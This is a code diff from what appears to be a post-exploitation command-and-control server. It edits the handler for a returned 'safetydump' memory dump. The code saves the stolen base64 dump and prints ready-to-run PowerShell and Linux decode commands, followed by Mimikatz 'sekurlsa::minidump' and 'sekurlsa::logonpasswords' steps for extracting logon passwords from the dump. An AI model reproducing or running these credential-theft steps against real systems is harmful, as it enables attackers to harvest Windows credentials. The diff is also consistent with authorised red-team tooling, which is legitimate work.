@@ -188,15 +188,16 @@ def newTaskOutput(uriPath, cookieVal, post_data, wsclient=False):
                     dumppath = "%s%s" % (DownloadsDirectory, dumpname)
                     open(dumppath, 'w').write(rawoutput)
                     message = "Dump written to: %s" % dumppath
-                    message = message + "\n The base64 blob needs decoding on Windows and then Mimikatz can be run against it."
-                    message = message + "\n E.g:"
+                    message = message + "\n The base64 blob needs decoding, e.g. on Windows to use Mimikatz:"
                     message = message + "\n     $filename = '.\\%s'" % dumpname
                     message = message + "\n     $b64 = Get-Content $filename"
                     message = message + "\n     $bytes = [System.Convert]::FromBase64String($b64)"
-                    message = message + "\n     [io.file]::WriteAllBytes(((Get-Item -Path \".\\\").FullName) + 'safetydump.dmp', $bytes)"
+                    message = message + "\n     [io.file]::WriteAllBytes(((Get-Item -Path \".\\\").FullName) + '\\safetydump.dmp', $bytes)"
                     message = message + "\n     ./mimikatz.exe"
                     message = message + "\n     sekurlsa::minidump safetydump.dmp"
                     message = message + "\n     sekurlsa::logonpasswords"
+                    message = message + "\nOr to just decode on Linux:"
+                    message = message + f"\n     base64 -id {dumpname} > dump.bin"
                     DB.update_task(taskId, message)
                     print(message)
 
